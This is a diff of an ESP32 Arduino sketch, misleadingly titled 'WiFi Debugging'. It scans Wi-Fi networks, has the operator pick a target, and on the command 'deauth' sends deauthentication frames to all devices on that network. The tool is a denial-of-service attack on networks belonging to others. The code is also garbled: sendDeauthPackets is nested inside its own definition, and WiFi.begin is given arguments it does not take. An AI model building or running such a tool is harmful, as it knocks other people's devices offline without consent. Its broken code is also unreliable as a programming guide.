@@ -1,9 +1,12 @@
-#include <Adafruit_GFX.h>
-#include <Adafruit_ILI9341.h>
+#include <TFT_eSPI.h>
 #include <WiFi.h>
 
+// Replace with your network credentials
+//const char* ssid = "your_SSID";
+//const char* password = "your_PASSWORD";
+
 // Initialize the display
-Adafruit_ILI9341 tft = Adafruit_ILI9341(TFT_CS, TFT_DC, TFT_RST);
+TFT_eSPI tft = TFT_eSPI();
 
 // Define deauthentication frame
 uint8_t deauth_frame_default[26] = {
@@ -14,21 +17,23 @@ uint8_t deauth_frame_default[26] = {
   0xf0, 0xff, 0x02, 0x00
 };
 
-void setup() {
-  // Start serial communication
-  Serial.begin(115200);
+void drawStartupAnimation() {
+  // Set up colors
+  uint16_t bgColor = TFT_BLACK;
+  uint16_t fgColor = TFT_WHITE;
 
-  // Initialize the display
-  tft.begin();
-  tft.setRotation(3);
-  tft.fillScreen(ILI9341_BLACK);
-  tft.setCursor(0, 0);
-  tft.setTextColor(ILI9341_WHITE);
-  tft.setTextSize(2);
-  tft.println("WiFi Debugging");
+  // Draw a cool startup animation
+  for (int i = 1; i <= tft.height() / 2; i += 5) {
+    tft.fillRect(i, i, tft.width() - 2 * i, tft.height() - 2 * i, fgColor);
+    tft.drawRect(i, i, tft.width() - 2 * i, tft.height() - 2 * i, bgColor);
+  }
 }
 
-void loop() {
+void drawNetworkList(int selection) {
+  // Set up colors
+  uint16_t bgColor = TFT_BLACK;
+  uint16_t fgColor = TFT_WHITE;
+
   // Scan for Wi-Fi networks
   int n = WiFi.scanNetworks();
 
@@ -40,67 +45,129 @@ void loop() {
     // Display the list of networks
     for (int i = 0; i < n; i++) {
       tft.setCursor(0, 30 + i * 10);
+      if (i == selection) {
+        tft.setTextColor(bgColor);
+        tft.fillRect(0, 30 + i * 10, tft.width(), 10, fgColor);
+      } else {
+        tft.setTextColor(fgColor);
+      }
       tft.print(i);
       tft.print(": ");
       tft.println(WiFi.SSID(i));
     }
+  }
+}
 
-    // Wait for user input to select a network to target
-    int selection = -1;
-    while (selection < 0 || selection >= n) {
-      tft.setCursor(0, 30 + n * 10);
-      tft.println("Enter selection (0 - " + String(n - 1) + "):");
-      while (Serial.available() == 0) {
-        // Wait for user input
+void drawSelectedNetwork(String selected_ssid) {
+  // Set up colors
+  uint16_t bgColor = TFT_BLACK;
+  uint16_t fgColor = TFT_WHITE;
+
+  // Display the selected network
+  tft.setCursor(0, tft.height() - 10);
+  tft.setTextColor(fgColor);
+  tft.println("Selected network: " + selected_ssid);
+}
+
+void sendDeauthPackets(String selected_ssid, uint8_t* deauth_frame) {
+  // Get the list of connected devices on the selected network
+  int num_devices = WiFi.softAPgetStationNum();
+  wifi_sta_list_t sta_list;
+  memset(&sta_list, 0, sizeof(sta_list));
+  esp_wifi_ap_get_sta_list(&sta_list);
+
+  // Send deauthentication frames to all connected devices on the selected network 
+  void sendDeauthPackets(String selected_ssid, uint8_t* deauth_frame) {
+  // Get the list of connected devices on the selected network
+  int num_devices = WiFi.softAPgetStationNum();
+  wifi_sta_list_t sta_list;
+  memset(&sta_list, 0, sizeof(sta_list));
+  esp_wifi_ap_get_sta_list(&sta_list);
+
+  // Send deauthentication frames to all connected devices on the selected network
+  for (int i = 0; i < sta_list.num; i++) {
+    String mac_address = "";
+    for (int j = 0; j < 6; j++) {
+      if (j > 0) {
+        mac_address += ":";
       }
-      selection = Serial.parseInt();
-      Serial.println(selection);
+      mac_address += String(sta_list.sta[i].mac[j], HEX);
     }
+    Serial.println("Sending deauth packet to: " + mac_address);
 
-    // Display the selected network and send deauthentication frames to all connected devices
-    String selected_ssid = WiFi.SSID(selection);
-    tft.setCursor(0, 30 + n * 10);
-    tft.println("Selected network: " + selected_ssid);
-    while (true) {
-    
-    // Get the list of connected devices on the selected network
-int num_devices = WiFi.softAPgetStationNum();
-wifi_sta_list_t sta_list;
-memset(&sta_list, 0, sizeof(sta_list));
-esp_wifi_ap_get_sta_list(&sta_list);
+    WiFi.disconnect();
+    WiFi.mode(WIFI_STA);
+    WiFi.begin(selected_ssid.c_str(), mac_address.c_str(), 1, deauth_frame);
+    while (WiFi.status() != WL_DISCONNECTED) {
+      // Wait for disconnection
+      delay(10);
+    }
+    Serial.println("Deauth packet sent to: " + mac_address);
+    delay(10);
+  }
+}
 
-// Send deauthentication frames to all connected devices on the selected network
-for (int i = 0; i < sta_list.num; i++) {
-  WiFi.disconnect();
+void setup() {
+  // Start serial communication
+  Serial.begin(115200);
+
+  // Initialize the display
+  tft.begin();
+  tft.setRotation(3);
+  tft.fillScreen(TFT_BLACK);
+  tft.setCursor(0, 0);
+  tft.setTextColor(TFT_WHITE);
+  tft.setTextSize(2);
+  tft.println("WiFi Debugging");
+
+  // Draw the startup animation
+  drawStartupAnimation();
+
+  // Set up the Wi-Fi connection
   WiFi.mode(WIFI_STA);
+  WiFi.disconnect();
+  delay(100);
+}
+
+void loop() {
+  // Draw the list of networks
+  drawNetworkList(-1);
+
+  // Wait for user input to select a network to target
+  int selection = -1;
+  while (selection < 0 || selection >= WiFi.scanNetworks()) {
+    while (Serial.available() == 0) {
+      // Wait for user input
+    }
+    selection = Serial.parseInt();
+    Serial.println(selection);
+  }
+
+  // Connect to the selected network
+  String selected_ssid = WiFi.SSID(selection);
   WiFi.begin(selected_ssid.c_str());
   while (WiFi.status() != WL_CONNECTED) {
     // Wait for connection
     delay(100);
   }
-  Serial.print("Connected to " + selected_ssid + " as ");
-  Serial.println(WiFi.localIP());
+  Serial.println("Connected to " + selected_ssid);
 
-  uint8_t * mac = sta_list.sta[i].mac;
-  char mac_addr[18];
-  snprintf(mac_addr, sizeof(mac_addr), "%02X:%02X:%02X:%02X:%02X:%02X",
-           mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
-  Serial.print("Sending deauth packet to: ");
-  Serial.println(mac_addr);
+  // Draw the selected network
+  drawSelectedNetwork(selected_ssid);
 
-  // Build deauthentication frame
-  uint8_t deauth_frame[26];
-  memcpy(deauth_frame, deauth_frame_default, 26);
-  memcpy(&deauth_frame[4], mac, 6);
+  // Wait for user input to send deauth packets
+  while (Serial.available() == 0) {
+    // Wait for user input
+  }
+  String input = Serial.readStringUntil('\n');
+  if (input == "deauth") {
+    sendDeauthPackets(selected_ssid, deauth_frame_default);
+  }
 
-  // Send deauthentication frame
+  // Disconnect from the network
   WiFi.disconnect();
   WiFi.mode(WIFI_OFF);
-  delay(100);
-  WiFi.mode(WIFI_STA);
-  delay(100);
-  WiFi.begin(selected_ssid.c_str(), "", 1, deauth_frame);
-  delay(10);
-  WiFi.disconnect();
-  WiFi.mode(WIFI_OFF);
+
+  // Clear the screen
+  tft.fillScreen(TFT_BLACK);
 }
